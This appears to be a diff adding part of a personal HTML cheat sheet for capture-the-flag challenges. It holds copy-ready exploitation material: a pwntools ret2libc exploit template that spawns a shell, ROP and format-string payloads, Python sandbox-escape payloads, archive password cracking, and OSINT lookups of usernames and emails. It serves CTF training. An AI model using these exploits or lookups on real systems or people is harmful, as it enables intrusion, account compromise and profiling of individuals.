+  <p class="lead">For <em>roplab / Phantom_Limit</em>: <b>checksec → find offset → match technique to protections</b> (NX on → ROP/ret2libc; PIE → leak first; canary → leak/bypass).</p>
+
+  <div class="card">
+    <h3>Protections &amp; offset</h3>
+    <div class="tags"><span>checksec</span><span>cyclic</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>checksec --file=./vuln        # NX / PIE / Canary / RELRO
+cyclic 200 | ./vuln           # crash; note the value in RSP / fault addr
+cyclic -l 0x6161616c          # -> exact offset to saved RIP</pre></div>
+    <table>
+      <tr><th>Protection</th><th>Approach</th></tr>
+      <tr><td>NX enabled</td><td>can't run shellcode on stack → ROP / ret2libc</td></tr>
+      <tr><td>PIE enabled</td><td>leak a code/libc address first, then add offsets</td></tr>
+      <tr><td>Canary</td><td>leak it (format string) or brute byte-by-byte (forking)</td></tr>
+      <tr><td>No PIE + NX off</td><td>jump to shellcode / ret2win easiest</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>pwntools exploit template (ret2libc)</h3>
+    <div class="tags"><span>pwntools</span><span>rop</span><span>ret2libc</span></div>
+    <div class="snip"><span class="lbl">copy-ready skeleton</span><button class="copy">Copy</button><pre>from pwn import *
+elf = context.binary = ELF("./vuln")
+libc = ELF("./libc.so.6")
+p = process("./vuln")              # remote("host",1337) for the server
+off = 72
+
+rop = ROP(elf)
+rop.raw(b"A"*off)
+rop.puts(elf.got['puts'])          # leak libc
+rop.main()                          # return to main for round 2
+p.sendlineafter(b">", rop.chain())
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc.address = leak - libc.sym['puts']
+log.success(f"libc base {hex(libc.address)}")
+
+rop2 = ROP(libc)
+rop2.raw(b"A"*off)
+rop2.system(next(libc.search(b"/bin/sh\x00")))
+p.sendlineafter(b">", rop2.chain())
+p.interactive()</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — gadgets, one_gadget, fmtstr</span><button class="copy">Copy</button><pre>ROPgadget --binary vuln | grep 'pop rdi ; ret'
+one_gadget libc.so.6                               # single-shot execve shell
+# unknown libc from leak: libc.rip  (paste symbol offsets)
+# format string write:
+payload = fmtstr_payload(6, {elf.got['exit']: elf.sym['win']})</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Common primitives</h3>
+    <div class="hint"><b>ret2win:</b> no libc needed — just overwrite RIP with the win()/flag func (watch 16-byte stack alignment → add a <code>ret</code> gadget). <b>GOT overwrite:</b> format string or arbitrary write → point a GOT entry at system. <b>Heap:</b> tcache poisoning / fastbin dup (how2heap). <b>Shellcode:</b> <code>asm(shellcraft.sh())</code> when NX is off.</div>
+  </div>
+</section>
+
+<!-- ================================================================ OSINT -->
+<section class="panel" data-tab="OSINT">
+  <h2>OSINT</h2>
+  <p class="lead">Pivot from whatever you're given — a photo, username, domain, ship/flight — to the answer. Most of this is web-based; the CLI tools just bulk it up.</p>
+
+  <div class="card">
+    <h3>Images &amp; geolocation</h3>
+    <div class="tags"><span>exif-gps</span><span>reverse-image</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>exiftool photo.jpg | grep -iE 'gps|date|model|software|serial'
+# GPS -> paste "lat, lon" into Google Maps
+# No GPS? reverse image: Google Lens, Yandex (best for places), TinEye, Bing Visual</pre></div>
+    <div class="hint"><b>Geolocate by content:</b> road-signs language, license plates, sun angle/shadows, architecture, store names → search them. SunCalc for time-of-day from shadows.</div>
+  </div>
+
+  <div class="card">
+    <h3>Usernames, domains, history</h3>
+    <div class="tags"><span>sherlock</span><span>crt.sh</span><span>wayback</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>sherlock USERNAME                       # accounts across 400+ sites
+holehe EMAIL                             # which services an email is registered on
+curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
+curl -s 'http://web.archive.org/cdx/search/cdx?url=target.com*&output=json' | head</pre></div>
+    <div class="hint"><b>Tool map:</b> username→WhatsMyName/Maigret · domain→whois/dnsrecon/crt.sh · old page→archive.org + Google cache · ships→MarineTraffic/VesselFinder · planes→ADS-B Exchange/FlightRadar24 · code leaks→GitHub dorks + grep.app.</div>
+  </div>
+</section>
+
+<!-- ================================================================ MISC -->
+<section class="panel" data-tab="Misc">
+  <h2>Misc / Archives / Jail / QR</h2>
+  <p class="lead">Catch-all: cracking protected archives, escaping sandboxes (<em>Clean_Slate, One_Line_at_a_Time</em>), decoding QR/barcodes.</p>
+
+  <div class="card">
+    <h3>Password-protected archives</h3>
+    <div class="tags"><span>john</span><span>fcrackzip</span><span>bkcrack</span></div>
+    <div class="snip"><span class="lbl">primary — crack the password</span><button class="copy">Copy</button><pre>zip2john secret.zip > h && john --wordlist=rockyou.txt h
+fcrackzip -u -D -p rockyou.txt secret.zip
+# other formats: rar2john · 7z2john.pl · pdf2john.pl · office2john.py  (in /usr/share/john/)
+pdfcrack -w rockyou.txt doc.pdf</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — known-plaintext ZipCrypto (no password needed)</span><button class="copy">Copy</button><pre># you know one file's plaintext that's inside the encrypted zip:
+bkcrack -C enc.zip -c secret.txt -p known_plain.bin        # recovers internal keys
+bkcrack -C enc.zip -k k0 k1 k2 -D out.zip                   # decrypt everything</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Python / shell jail escapes</h3>
+    <div class="tags"><span>pyjail</span><span>bash</span></div>
+    <div class="snip"><span class="lbl">copy-ready</span><button class="copy">Copy</button><pre># Python sandbox -> get os:
+().__class__.__bases__[0].__subclasses__()         # enumerate to find Popen/os
+__builtins__.__import__('os').system('sh')
+breakpoint()                                        # if pdb reachable
+# no underscores/quotes? build names via chr() + getattr(), or use
+getattr(getattr(__import__(chr(111)+chr(115)),'system'))('sh')
+# Bash restricted shell: ls via echo *, use $(printf) , vi :!sh , env programs</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>QR / barcodes</h3>
+    <div class="tags"><span>zbarimg</span><span>qr</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>zbarimg code.png                 # decode QR / EAN / Code128 ...
+# broken QR: open in GIMP, restore the 3 finder squares + quiet zone, re-scan
+# raw QR matrix -> reconstruct at qrazybox.com (recover with partial data)</pre></div>
+  </div>
+</section>
+
+<footer>
+  Local reference · <b>D:\03_CTF\ctf_tool\CTF_Techniques_Cheatsheet.html</b> · run <b>install.sh</b> (in this folder) on Kali/WSL to get every tool · scripts in <b>automate/</b> · see <b>README.md</b>.<br>
+  Swap <code>process()</code>↔<code>remote()</code> for local vs. remote pwn · replace <code>rockyou.txt</code> with your wordlist · use only on challenges/targets you're authorized to test.
+</footer>
+</main>
+
+<script>
+const panels=[...document.querySelectorAll('.panel')];
+const tabsEl=document.getElementById('tabs'), search=document.getElementById('search'), nores=document.getElementById('nores');
+
+// build tab bar
+panels.forEach((p,i)=>{
+  const b=document.createElement('button');
+  b.textContent=p.dataset.tab;
+  b.addEventListener('click',()=>{ if(search.value){search.value='';runSearch();} activate(i); });
+  tabsEl.appendChild(b);
+});
+const tabBtns=[...tabsEl.children];
+function activate(i){
+  panels.forEach((p,j)=>p.classList.toggle('show',i===j));
+  tabBtns.forEach((b,j)=>b.classList.toggle('active',i===j));
+  location.hash=encodeURIComponent(panels[i].dataset.tab);
+  window.scrollTo(0,0);
+}
+
+// restore from hash
+const want=decodeURIComponent(location.hash.slice(1));
+const start=Math.max(0,panels.findIndex(p=>p.dataset.tab===want));
+activate(start);
+
+// copy buttons
+document.addEventListener('click',e=>{
+  if(!e.target.classList.contains('copy'))return;
+  const btn=e.target, pre=btn.parentElement.querySelector('pre'), txt=pre.innerText;
+  const done=()=>{const o=btn.textContent;btn.textContent='Copied ✓';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok');},1200);};
+  (navigator.clipboard?navigator.clipboard.writeText(txt):Promise.reject())
+    .then(done).catch(()=>{ const r=document.createRange();r.selectNode(pre);
+      getSelection().removeAllRanges();getSelection().addRange(r);
+      try{document.execCommand('copy');done();}catch(_){} getSelection().removeAllRanges(); });
+});
+
+// search across ALL tabs
+function runSearch(){
+  const q=search.value.toLowerCase().trim();
+  if(!q){ tabsEl.style.display=''; activate(panels.findIndex(p=>p.classList.contains('show'))||0);
+    panels.forEach(p=>p.querySelectorAll('.card').forEach(c=>c.style.display='')); nores.style.display='none'; return; }
+  tabsEl.style.display='none';
+  let any=false;
+  panels.forEach(p=>{
+    let pv=false;
+    p.querySelectorAll('.card').forEach(c=>{const m=c.innerText.toLowerCase().includes(q);c.style.display=m?'':'none';if(m)pv=true;});
+    p.classList.toggle('show',pv); if(pv)any=true;
+  });
+  nores.style.display=any?'none':'block';
+}
+search.addEventListener('input',runSearch);
+document.addEventListener('keydown',e=>{
+  if(e.key==='/'&&document.activeElement!==search){e.preventDefault();search.focus();}
+  if(e.key==='Escape'){search.value='';runSearch();search.blur();}
+});
+</script>
+</body>
+</html>
